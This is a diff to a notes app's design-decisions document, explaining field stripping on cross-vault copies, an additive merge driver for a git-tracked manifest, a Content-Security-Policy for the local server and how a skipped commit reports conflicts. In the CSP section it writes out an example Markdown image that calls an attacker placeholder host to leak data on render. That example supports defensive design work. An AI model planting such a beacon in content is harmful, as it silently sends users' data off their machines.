@@ -506,7 +506,14 @@ not**:
   note — same id in two vaults makes one unreachable via `get`), body rewritten by
   `fm-app/refs.rs::strip_cross_vault` to drop every `note:` link and (unless opted in) every
   `asset:`/`sha256:`/local-image reference — whole Markdown span, label included — replaced by
-  a fixed marker, and `assets`/`code` cleared. So a copy can never point outside its new vault.
+  a fixed marker, and `assets`/`code` cleared. **Every field a human can type into is stripped
+  the same way** — `title`, `status`, `tags`, and both the keys and values of `extra`
+  (`refs::strip_value`, recursing into lists). A 2026-07-20 review found the strip was body-only;
+  the fix for *that* then missed `status` and `tags`, because they are **typed `Object` fields
+  rather than `extra` entries**, so a fix reasoning about the property map never saw them — and
+  the test written alongside built its haystack from `title` + `extra` and stayed green. Both are
+  free-form user text (`board` groups by any `status` string; a tag is any string). Enumerate the
+  fields, do not iterate a map. So a copy can never point outside its new vault.
 - **Opt-in carries into the target, never points out.** `with_assets` copies the first-degree
   blobs *into* the target (`BlobStore`, content-addressed dedup; manifest refreshed) so it is
   self-contained; note links stay stripped (the linked-notes tier is deferred, and by the same
@@ -1104,7 +1111,31 @@ the vault's remote (stored in the vault's own `.git/config` — no new config
 file, and decoupled from the app's source remote by construction). **A push
 carries notes only**: media is off-sited only when the box is ticked, stated in
 the panel rather than tracked. `manifest.json` is git-tracked, so a git-only
-restore still knows its blob inventory and `fm verify` names what is missing.
+restore still knows its blob inventory and `fm verify` names what is missing —
+and because it is tracked *and* staged on every commit, it needs its own merge
+driver (`manifest.json merge=fm-manifest` → `fm merge-manifest`). Text-
+merged it produced `<<<<<<<` inside a JSON file no user wrote or can resolve,
+which then froze commits vault-wide.
+
+**The merge is purely additive — `base ∪ ours ∪ theirs` — and the absence of a
+deletion rule is the whole decision.** The obvious 3-way rule ("in base, gone
+from one side ⇒ deleted") is wrong here: `blobs/` is gitignored and every writer
+is a rebuild from local disk, so this is a git-tracked inventory of a
+**per-machine** store and each clone legitimately holds a different subset.
+"Absent on their side" means *they never received those bytes*. Applying the rule
+made the manifest converge on the **intersection** of what each machine happened
+to hold, erasing the record of blobs that exist — destroying the one thing the
+file is for. The cost of being additive is an entry outliving its blob, which
+`verify` reports and `fm manifest` clears: visible and recoverable, versus silent
+and permanent.
+
+**The driver must never exit non-zero**, which is a correctness rule, not tidiness:
+git reads any non-zero exit as "I left you a conflict in %A" while %A is untouched
+and marker-free — the trap `install_merge_driver` documents — and here a conflicted
+`manifest.json` freezes commits for the whole vault. So every side is read
+leniently (an unparseable manifest is *no information*, not a failure) and a failed
+write keeps ours. Android has no driver at all (libgit2 cannot spawn one), so
+`git_native::pull` routes the path by name to the same `Manifest::merge`.
 `destination.ts` classifies both a git URL and a restic repo as local/remote —
 a local path is a legitimate destination but must never be reported as "off this
 machine".
@@ -1198,3 +1229,50 @@ the platform's means the app follows the device's own trust decisions and OS upd
 GitSync does, and it skips hostname verification while sending `userpass_plaintext` over an
 unauthenticated connection. The leaf certificate libgit2 hands the callback has no chain, so real
 verification is not possible there either.
+
+## `fm-serve` sends a Content-Security-Policy, and it is the "nothing phones home" guard
+**Why:** a note is Markdown, and Markdown renders remote images. A single
+`![](https://attacker/p.png?leak=…)` in a note that arrived by merge, by copy, or in a shared
+vault fetches the attacker's URL **on render, from the user's machine**. That is not an XSS
+chain: it needs no script, it survives DOMPurify (whose allow-list permits `https:`), and it
+survives a human reading the diff. Until 2026-07-20 there was no CSP anywhere in the server —
+the app self-hosted Excalidraw's fonts precisely to avoid this class, and then left the door
+open for note content. **Consequence:** `write_response` sends one policy on every response
+(`main.rs::CSP`), plus `nosniff` and `Referrer-Policy: no-referrer`; blobs get
+`default-src 'none'; sandbox` behind their existing `Content-Disposition: attachment`.
+`frame-ancestors 'none'` is separate from `default-src` and load-bearing: the server sits on a
+fixed localhost port with no auth, so any page the user visits could otherwise frame it.
+**Accepted losses, both real:** `'unsafe-eval'` is refused, so Excalidraw's harfbuzz font
+*subsetter* throws and an exported SVG embeds a font URL rather than the bytes (in-app boards are
+fine); and no CSP directive stops a top-level navigation the user clicks, which
+`Referrer-Policy: no-referrer` only blunts. **The Android shell now sets its own CSP in
+`tauri.conf.json` — it was `null`, i.e. the phone was the only wholly unguarded surface — but
+that policy was verified only as far as *launching clean* on a real phone — installed, started,
+zero CSP violations in logcat, and the embedded frontend confirmed free of inline `<script>`. It
+admits `http://fmblob.localhost` (wry rewrites the custom scheme on Android) and Tauri's `ipc:`
+origin, but neither has been exercised: opening a note with an image and a whiteboard is what
+would prove them, and getting either wrong shows up as broken images rather than a crash.**
+
+The two clauses that shape the app's own code: `img-src 'self' data: blob:` is the beacon fix
+(`data:`/`blob:` are local bytes, so they carry no request off the machine), and **`script-src
+'self'` with no `'unsafe-inline'`** — which is why Excalidraw's `EXCALIDRAW_ASSET_PATH` line
+moved out of `index.html` into `ui/public/excalidraw-asset-path.js`. Keeping inline scripts out
+is what stops a sanitiser bypass from being code execution. `style-src 'unsafe-inline'` is
+unavoidable and low-risk: Mermaid injects `<style>` and KaTeX/Excalidraw set `style=` on
+everything they draw. The Android shell serves through its own custom scheme and is unaffected.
+
+## A commit that committed nothing must say *why*
+**Why:** `commit_all` returns `Ok(false)` both for "clean tree, nothing to do" and for "this
+vault is mid-merge, so I refuse" — and those are opposites. The refusal is right (staging
+conflict markers would publish them as content), but read as success it means **every write
+after the conflict is saved to disk and never committed**, for as long as the conflict sits
+there, while the sync loop reports `synced`. **Consequence:** the `commit` dispatch arm answers
+`CommitResult { committed, conflicts }`, filling `conflicts` from `vcs::conflicts` whenever it
+committed nothing, and **all three callers** stop at the `conflicts` phase, which the UI already knows how to
+show. The third one is the point: `App.svelte`'s 5 s debounced auto-commit is what
+`commit_all` itself calls "the default path, not an edge case", and the first version of this
+fix touched only `sync.svelte.ts` — so the dominant caller kept swallowing it. The extra
+`vcs::conflicts` call is gated on `.git/MERGE_HEAD` existing, so the common case (clean tree)
+costs a `stat`, not a second `git status` spawn. The `git.rs`/`git_native.rs` signatures were
+deliberately **not** changed: the distinction is only needed where a human is told about it,
+and widening the seam would have touched both backends and forty call sites for nothing.
